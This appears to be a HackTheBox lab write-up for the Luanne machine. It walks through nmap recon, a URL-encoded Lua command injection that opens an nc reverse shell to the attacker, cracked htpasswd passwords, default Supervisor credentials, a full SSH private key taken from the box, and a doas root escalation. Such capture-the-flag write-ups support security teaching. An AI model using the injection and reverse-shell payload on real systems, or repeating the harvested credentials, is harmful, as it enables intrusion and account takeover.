---
layout: post
title:  "HackTheBox Luanne Writeup" 
tags: hackthebox lua-app netbsd medusa-supervisor
categories: hackthebox active-machine 
rel-img: /assets/img/htb/luanne/luanne.png
description: Abusing Lua app to and medusa supervisor get first access and gain user. Netbsd priivilege escalation lead to root!!
---

### Hackthebox Luanne Writeup
![Luanne](/assets/img/htb/luanne/luanne.png)

## Abstract

Abusing Lua app and medusa supervisor to get first access and gain user. Netbsd priivilege escalation lead to root!!

## Summary
1. Initial foothold
  - Nmap recon
2. Lua reverse shell
3. Medusa Supervisor
4. User Flag
5. Privilege Escalation
  - Netbsd enumeration 
6. Root Flag

## Initial foothold

### Nmap recon

```
sh4ck@kali:~/Desktop$ sudo nmap -A 10.10.10.218
[sudo] password for sh4ck: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-30 09:43 CET
Nmap scan report for 10.10.10.218
Host is up (0.053s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
| ssh-hostkey: 
|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
80/tcp   open  http    nginx 1.19.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=.
| http-robots.txt: 1 disallowed entry 
|_/weather
|_http-server-header: nginx/1.19.0
|_http-title: 401 Unauthorized
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=default
|_http-server-header: Medusa/1.12
|_http-title: Error response
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/30%OT=22%CT=1%CU=36612%PV=Y%DS=2%DC=T%G=Y%TM=5FC4B1
OS:1B%P=x86_64-pc-linux-gnu)SEQ(SP=D6%GCD=1%ISR=E8%TI=Z%CI=Z%II=I)OPS(O1=M5
OS:4DNW3ST11%O2=M54DNW3ST11%O3=M54DNW3NNT11%O4=M54DNW3ST11%O5=M54DNW3ST11%O
OS:6=M54DST11)WIN(W1=8000%W2=8000%W3=8000%W4=8000%W5=8000%W6=8000)ECN(R=Y%D
OS:F=Y%T=40%W=8000%O=M54DNW3SLL%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=Y%DF=N%T=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=40%W=8000
OS:%S=O%A=S+%F=AS%O=M54DNW3ST11%RD=0%Q=)T4(R=Y%DF=N%T=40%W=0%S=A%A=Z%F=R%O=
OS:%RD=0%Q=)T5(R=Y%DF=N%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=N%T=40%
OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=N%T=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
OS:U1(R=Y%DF=N%T=FF%IPL=38%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DF
OS:I=N%T=FF%CD=S)

Network Distance: 2 hops
Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   52.80 ms 10.10.14.1
2   52.97 ms 10.10.10.218

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.25 seconds
```
Nmap showed three open ports 22,80,9001. Port 80 revealed ngnix web server with basic authentication, and the port 9001the  `Medusa Supervisor process manager`.

## Lua Reverse Shell

I ran gobuster under weather folder (as per robots.txt) and found forecast Lua app:

![lua app](/assets/img/htb/luanne/lua-app.png)

After some google fu found a way to run reverse shell:

```
http://10.10.10.218/weather/forecast?city=London%27%29%3Bos.execute%28%22rm%20%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.26%204545%20%3E%2Ftmp%2Ff%22%29--
```

and got it:

```
sh4ck@kali:~/Desktop$ nc -nlvp 4545
listening on [any] 4545 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.218] 57609
sh: can't access tty; job control turned off
$ id
uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
``` 
I found http basic auth onto .htpasswd

```
$ ls -la
total 20
drwxr-xr-x   2 root  wheel  512 Nov 25 11:27 .
drwxr-xr-x  24 root  wheel  512 Nov 24 09:55 ..
-rw-r--r--   1 root  wheel   47 Sep 16 15:07 .htpasswd
-rw-r--r--   1 root  wheel  386 Sep 17 20:56 index.html
-rw-r--r--   1 root  wheel   78 Nov 25 11:38 robots.txt
$ cat .htpasswd
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
```
I proceeded to cracking hash with hashcat and got: `iamthebest`

So i enumerated home folder: 
```
$ ls -la /home
total 12
drwxr-xr-x   3 root        wheel  512 Sep 14 06:46 .
drwxr-xr-x  21 root        wheel  512 Sep 16 22:05 ..
dr-xr-x---   7 r.michaels  users  512 Sep 16 18:20 r.michaels
```
and at the same time, i decided to explore service at port 9001. 

## Medusa Supervisor

After some search on google, i discovered the Supervisor repo and the configuration file at `https://github.com/Supervisor/supervisor/blob/master/docs/configuration.rst` where i spotted default credentials for basic auht `user:123`.

I was able to login in:

![supervisor home page](/assets/img/htb/luanne/supervisor.png)

And in process tab i saw something interesting:

![supervisor process](/assets/img/htb/luanne/supervisor-process.png)

Lua application ran on port 3001 and had access to r.michaels home folder ... so i tried to connect to folder:

```
$ curl --user webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   601    0   601    0     0   195k      0 --:--:-- --:--:-- --:--:--  195k
<!DOCTYPE html>
<html><head><meta charset="utf-8"/>
<style type="text/css">
table {
        border-top: 1px solid black;
        border-bottom: 1px solid black;
}
th { background: aquamarine; }
tr:nth-child(even) { background: lavender; }
</style>
<title>Index of ~r.michaels/</title></head>
<body><h1>Index of ~r.michaels/</h1>
<table cols=3>
<thead>
<tr><th>Name<th>Last modified<th align=right>Size
<tbody>
<tr><td><a href="../">Parent Directory</a><td>16-Sep-2020 18:20<td align=right>1kB
<tr><td><a href="id_rsa">id_rsa</a><td>16-Sep-2020 16:52<td align=right>3kB
</table>
</body></html>
```
and i discovered a id_rsa. So i caught the key:

``` 
$ curl --user webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2610  100  2610    0     0  1274k      0 --:--:-- --:--:-- --:--:-- 1274k
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvXxJBbm4VKcT2HABKV2Kzh9GcatzEJRyvv4AAalt349ncfDkMfFB
Icxo9PpLUYzecwdU3LqJlzjFga3kG7VdSEWm+C1fiI4LRwv/iRKyPPvFGTVWvxDXFTKWXh
0DpaB9XVjggYHMr0dbYcSF2V5GMfIyxHQ8vGAE+QeW9I0Z2nl54ar/I/j7c87SY59uRnHQ
kzRXevtPSUXxytfuHYr1Ie1YpGpdKqYrYjevaQR5CAFdXPobMSxpNxFnPyyTFhAbzQuchD
ryXEuMkQOxsqeavnzonomJSuJMIh4ym7NkfQ3eKaPdwbwpiLMZoNReUkBqvsvSBpANVuyK
BNUj4JWjBpo85lrGqB+NG2MuySTtfS8lXwDvNtk/DB3ZSg5OFoL0LKZeCeaE6vXQR5h9t8
3CEdSO8yVrcYMPlzVRBcHp00DdLk4cCtqj+diZmR8MrXokSR8y5XqD3/IdH5+zj1BTHZXE
pXXqVFFB7Jae+LtuZ3XTESrVnpvBY48YRkQXAmMVAAAFkBjYH6gY2B+oAAAAB3NzaC1yc2
EAAAGBAL18SQW5uFSnE9hwASldis4fRnGrcxCUcr7+AAGpbd+PZ3Hw5DHxQSHMaPT6S1GM
3nMHVNy6iZc4xYGt5Bu1XUhFpvgtX4iOC0cL/4kSsjz7xRk1Vr8Q1xUyll4dA6WgfV1Y4I
GBzK9HW2HEhdleRjHyMsR0PLxgBPkHlvSNGdp5eeGq/yP4+3PO0mOfbkZx0JM0V3r7T0lF
8crX7h2K9SHtWKRqXSqmK2I3r2kEeQgBXVz6GzEsaTcRZz8skxYQG80LnIQ68lxLjJEDsb
Knmr586J6JiUriTCIeMpuzZH0N3imj3cG8KYizGaDUXlJAar7L0gaQDVbsigTVI+CVowaa
POZaxqgfjRtjLskk7X0vJV8A7zbZPwwd2UoOThaC9CymXgnmhOr10EeYfbfNwhHUjvMla3
GDD5c1UQXB6dNA3S5OHArao/nYmZkfDK16JEkfMuV6g9/yHR+fs49QUx2VxKV16lRRQeyW
nvi7bmd10xEq1Z6bwWOPGEZEFwJjFQAAAAMBAAEAAAGAStrodgySV07RtjU5IEBF73vHdm
xGvowGcJEjK4TlVOXv9cE2RMyL8HAyHmUqkALYdhS1X6WJaWYSEFLDxHZ3bW+msHAsR2Pl
7KE+x8XNB+5mRLkflcdvUH51jKRlpm6qV9AekMrYM347CXp7bg2iKWUGzTkmLTy5ei+XYP
DE/9vxXEcTGADqRSu1TYnUJJwdy6lnzbut7MJm7L004hLdGBQNapZiS9DtXpWlBBWyQolX
er2LNHfY8No9MWXIjXS6+MATUH27TttEgQY3LVztY0TRXeHgmC1fdt0yhW2eV/Wx+oVG6n
NdBeFEuz/BBQkgVE7Fk9gYKGj+woMKzO+L8eDll0QFi+GNtugXN4FiduwI1w1DPp+W6+su
o624DqUT47mcbxulMkA+XCXMOIEFvdfUfmkCs/ej64m7OsRaIs8Xzv2mb3ER2ZBDXe19i8
Pm/+ofP8HaHlCnc9jEDfzDN83HX9CjZFYQ4n1KwOrvZbPM1+Y5No3yKq+tKdzUsiwZAAAA
wFXoX8cQH66j83Tup9oYNSzXw7Ft8TgxKtKk76lAYcbITP/wQhjnZcfUXn0WDQKCbVnOp6
LmyabN2lPPD3zRtRj5O/sLee68xZHr09I/Uiwj+mvBHzVe3bvLL0zMLBxCKd0J++i3FwOv
+ztOM/3WmmlsERG2GOcFPxz0L2uVFve8PtNpJvy3MxaYl/zwZKkvIXtqu+WXXpFxXOP9qc
f2jJom8mmRLvGFOe0akCBV2NCGq/nJ4bn0B9vuexwEpxax4QAAAMEA44eCmj/6raALAYcO
D1UZwPTuJHZ/89jaET6At6biCmfaBqYuhbvDYUa9C3LfWsq+07/S7khHSPXoJD0DjXAIZk
N+59o58CG82wvGl2RnwIpIOIFPoQyim/T0q0FN6CIFe6csJg8RDdvq2NaD6k6vKSk6rRgo
IH3BXK8fc7hLQw58o5kwdFakClbs/q9+Uc7lnDBmo33ytQ9pqNVuu6nxZqI2lG88QvWjPg
nUtRpvXwMi0/QMLzzoC6TJwzAn39GXAAAAwQDVMhwBL97HThxI60inI1SrowaSpMLMbWqq
189zIG0dHfVDVQBCXd2Rng15eN5WnsW2LL8iHL25T5K2yi+hsZHU6jJ0CNuB1X6ITuHhQg
QLAuGW2EaxejWHYC5gTh7jwK6wOwQArJhU48h6DFl+5PUO8KQCDBC9WaGm3EVXbPwXlzp9
9OGmTT9AggBQJhLiXlkoSMReS36EYkxEncYdWM7zmC2kkxPTSVWz94I87YvApj0vepuB7b
45bBkP5xOhrjMAAAAVci5taWNoYWVsc0BsdWFubmUuaHRiAQIDBAUG
-----END OPENSSH PRIVATE KEY-----
```
## User Flag

Than i connected to macchine with ssh as r.micharls and got user Flag:

```
sh4ck@kali:~/Desktop/Luanne$ vi id_rma
sh4ck@kali:~/Desktop/Luanne$ chmod 600 id_rma 
sh4ck@kali:~/Desktop/Luanne$ ssh -i id_rma r.michaels@10.10.10.218
The authenticity of host '10.10.10.218 (10.10.10.218)' can't be established.
ECDSA key fingerprint is SHA256:KB1gw0t+80YeM3PEDp7AjlTqJUN+gdyWKXoCrXn7AZo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.218' (ECDSA) to the list of known hosts.
Last login: Mon Nov 30 11:28:44 2020 from 10.10.14.57
NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020

Welcome to NetBSD!

luanne$
luanne$ ls -la
total 52
dr-xr-x---  7 r.michaels  users   512 Sep 16 18:20 .
drwxr-xr-x  3 root        wheel   512 Sep 14 06:46 ..
-rw-r--r--  1 r.michaels  users  1772 Feb 14  2020 .cshrc
drwx------  2 r.michaels  users   512 Nov 30 07:48 .gnupg
-rw-r--r--  1 r.michaels  users   431 Feb 14  2020 .login
-rw-r--r--  1 r.michaels  users   265 Feb 14  2020 .logout
-rw-r--r--  1 r.michaels  users  1498 Feb 14  2020 .profile
-rw-r--r--  1 r.michaels  users   166 Feb 14  2020 .shrc
dr-x------  2 r.michaels  users   512 Sep 16 16:51 .ssh
dr-xr-xr-x  2 r.michaels  users   512 Nov 24 09:26 backups
dr-xr-x---  4 r.michaels  users   512 Sep 16 15:02 devel
dr-x------  2 r.michaels  users   512 Sep 16 16:52 public_html
-r--------  1 r.michaels  users    33 Sep 16 17:16 user.txt
```
## Privilege Escalation

### NetBsd Enumeration

I started with basic enumeration and found encrypted backup under backups folder. I made some research about encryption on NetBsd and found a way to decrypt backup:

```
luanne$ netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/devel_backup-2020-09-16.tar.gz
signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 
Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a 
uid              RSA 2048-bit key <r.michaels@localhost>
luanne$ cd /tmp/                                                                                                                                                                                                                          
luanne$ ls -la
total 20
drwxrwxrwt   2 root        wheel    48 Nov 30 14:28 .
drwxr-xr-x  21 root        wheel   512 Sep 16 22:05 ..
-rw-------   1 r.michaels  wheel  1639 Nov 30 14:28 devel_backup-2020-09-16.tar.gz
luanne$ tar -zxvf devel_backup-2020-09-16.tar.gz                                                                                                                                                                                          
x devel-2020-09-16/
x devel-2020-09-16/www/
x devel-2020-09-16/webapi/
x devel-2020-09-16/webapi/weather.lua
x devel-2020-09-16/www/index.html
x devel-2020-09-16/www/.htpasswd
```
Onto decrypted file i saw a `.htpasswd` file.   
```
luanne$ cd /tmp/devel-2020-09-16/                                                                                                                                                                                                         
luanne$ ls
webapi www
luanne$ cd www/                                                                                                                                                                                                                           
luanne$ ls -la
total 32
drwxr-xr-x  2 r.michaels  wheel   96 Sep 16 15:03 .
drwxr-x---  4 r.michaels  wheel   96 Sep 16 15:02 ..
-rw-r--r--  1 r.michaels  wheel   47 Sep 16 18:14 .htpasswd
-rw-r--r--  1 r.michaels  wheel  378 Sep 16 15:03 index.html
luanne$ cat .htpasswd                                                                                                                                                                                                                     
webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
```
So i decrypted hash as i done before and got password `littlebear`.

## Root Flag

With above password i was able to spawn root shell and to catch root.txt.
```
luanne$ doas -u root /bin/sh
Password:
luanne# cat /root/root.txt
```
